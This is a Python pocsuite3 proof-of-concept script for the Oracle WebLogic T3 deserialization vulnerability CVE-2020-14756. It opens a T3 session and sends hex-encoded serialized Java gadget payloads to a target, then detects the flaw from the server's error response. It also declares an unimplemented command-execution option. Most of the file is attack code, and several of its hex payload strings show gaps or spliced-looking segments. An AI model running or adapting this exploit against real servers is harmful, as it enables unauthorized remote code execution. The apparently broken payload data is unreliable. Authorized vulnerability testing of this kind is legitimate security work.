
"""
WebLogic CVE-2020-14756 POC 检测脚本

漏洞描述:
Oracle WebLogic Server 的 T3 协议存在反序列化漏洞(CVE-2020-14756)。
攻击者可以通过发送恶意的 T3 请求来执行任意代码。

影响版本:
- WebLogic 10.3.6.0.0
- WebLogic 12.1.3.0.0
- WebLogic 12.2.1.3.0
- WebLogic 12.2.1.4.0

检测原理:
通过建立 T3 连接并发送恶意的反序列化 payload,
如果服务器返回包含特定错误信息的响应,则说明存在漏洞。

使用方法:
    python CVE-2020-14756.py -u http://127.0.0.1:7001

参数说明:
    url: 目标URL,如 http://127.0.0.1:7001
    command: 可选,指定要执行的命令(攻击模式)

返回值:
    存在漏洞时返回成功信息,否则返回失败信息

注意:
    此POC仅用于安全测试和授权的渗透测试,请勿用于非法用途。
"""


import base64

import binascii
import re
import select
import socket
import time
from collections import OrderedDict
from urllib.parse import urlparse

from pocsuite3.api import Output, POCBase, register_poc, logger
from pocsuite3.lib.core.interpreter_option import OptString


class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = ''
    vulDate = '2021-01-21'
    createDate = '2021-01-21'
    updateDate = '2021-01-21'
    references = []
    name = 'WebLogic 反序列化远程命令执行漏洞(CVE-2020-14756)'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'WebLogic'
    appVersion = 'WebLogic 10.3.6.0.0、WebLogic 12.1.3.0.0、WebLogic12.2.1.3.0、WebLogic 12.2.1.4.0'
    vulType = 'Remote Command Execution'
    desc = '''
    WebLogic 反序列化远程命令执行漏洞(CVE-2020-14756)
    '''

    samples = []

    def _options(self):

        """
        定义POC的选项参数
        
        Returns:
            OrderedDict: 包含选项参数的字典
        """


        o = OrderedDict()
        o["command"] = OptString('', description='attack模式可以指定执行的命令')
        return o

    def recvall(self, s, length, timeout=10):

        """
        接收指定长度的数据
        
        Args:
            s: socket 对象
            length: 要接收的数据长度
            timeout: 超时时间(秒),默认10秒
        
        Returns:
            bytes: 接收到的数据,超时或出错返回 None
        """


        timeout = timeout
        endtime = time.time() + timeout
        rdata = b''
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                if not rdata:
                    return None
                else:
                    return rdata
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata

    def t3handshake(self, sock, server_addr):

        """
        建立 T3 握手连接
        
        Args:
            sock: socket 对象
            server_addr: 服务器地址 (ip, port)
        """


        sock.connect(server_addr)
        sock.send(binascii.a2b_hex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(1)
        sock.recv(1024)

    def buildt3requestobject(self, sock):

        """
        构建 T3 请求对象
        
        Args:
            sock: socket 对象
        """


        data1 = ("000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a7"
                 "77666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a0000"
                 "00030000000000000006007070707070700000000a00000003000000000000000600700"
                 "6fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c"
                 "65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6"
                 "f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900"
                 "056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b7365727"
                 "66963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c"
                 "657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f727"
                 "1007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000ac"
                 "ed00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e74727"
                 "92f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e74"
                 "65726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6"
                 "16765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061"
                 "636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612"
                 "f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400"
                 "025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636"
                 "b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249"
                 "000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706"
                 "f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c5665"
                 "6e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078f"
                 "e010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65"
                 "456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6"
                 "e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a"
                 "6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655"
                 "061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b"
                 "4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e6"


                 "696f6e496e666f972245516452463e0200035b00087061636b6167657371")
        data2 = ("007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f5"
                 "37472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200"
                 "247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e6"
                 "66fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c"
                 "696e67506174636849000b736572766963655061636b5a000e74656d706f72617279506"
                 "17463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f727100"
                 "7e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe01000"
                 "0aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a"
                 "0c000078707750210000000000000000000d3139322e3136382e312e323237001257494"
                 "e2d4147444d565155423154362e656883348cd60000000700001b59ffffffffffffffff"
                 "ffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f676"
                 "9632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07")
        data3 = '1a7727000d3234322e323134'
        data4 = '2e312e32353461863d1d0000000078'
        for d in [data1, data2, data3, data4]:
            sock.send(bytes.fromhex(d))
        time.sleep(2)

    def sendevilobjdata(self, sock, data):

        """
        发送恶意对象数据
        
        Args:
            sock: socket 对象
            data: 要发送的恶意数据
        
        Returns:
            str: 服务器响应内容
        """


        payload = ("056508000000010000001b0000005d0101007372017870737202787000000000000000007"
                   "57203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9b"
                   "cfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f67696"
                   "32e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200"


                   "78707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c020000787"
                   "07702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c617373"
                   "5461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e5"
                   "66563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e74"
                   "49000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a617"
                   "6612f6c616e672f4f626a6563743b78707702000078fe010000")
        payload += data
        payload += ("fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553"
                    "657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f676963"
                    "2e726d692e70726f76696465722e426173696353657276696365436f6e74657874e46322"
                    "36c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e746572"
                    "6e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c00007870773400"
                    "2e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c"
                    "2e55736572496e666f3b290000001b7878fe00ff")
        payload = "%08x%s" % (int((len(payload) / 2 + 4)), payload)
        sock.send(binascii.a2b_hex(payload))
        time.sleep(2)
        res = ""
        try:
            res = self.recvall(sock, 10000, 15)
            res = res.decode(encoding="utf-8", errors="ignore") if res else ""
        except socket.timeout:
            pass
        return res

    def test_uri(self, host, port, payload):

        """
        测试目标URL是否存在漏洞
        
        Args:
            host: 目标主机
            port: 目标端口
            payload: 恶意payload
        
        Returns:
            bool: 是否存在漏洞
        """


        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(20)
            server_addr = (host, port)
            self.t3handshake(sock, server_addr)
            self.buildt3requestobject(sock)
            resp = self.sendevilobjdata(sock, payload)
            matched_content = re.search(
                "com.tangosol.coherence.servlet.AttributeHolder cannot be cast to weblogic.rjvm.ClassTableEntry", resp)
            if matched_content:
                return True
        except Exception as ex:
            logger.error(str(ex))
        return False

    def _verify(self):

        """
        验证目标是否存在漏洞
        
        Returns:
            Output: 验证结果
        """


        output = Output(self)
        result = {}
        ports = [7001]
        port = urlparse(self.url).port
        host = urlparse(self.url).hostname
        if port and port not in ports:
            ports.append(port)

        payload = ("ACED00057372002E636F6D2E74616E676F736F6C2E636F686572656E63652E736572766C6"
                   "5742E417474726962757465486F6C646572CC30A4783DEF6AC10C000078707785400A3963"
                   "6F6D2E74616E676F736F6C2E7574696C2E61676772656761746F722E546F704E416767726"


                   "686572656E63652E726573742E7574696C2E657874726163746F722E4D76656C457874726"
                   "163746F7200000000000200000001010100000078")

        for port in ports:
            if self.test_uri(host, port, payload):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                output.success(result)
                break
        return output


poc = TestPOC



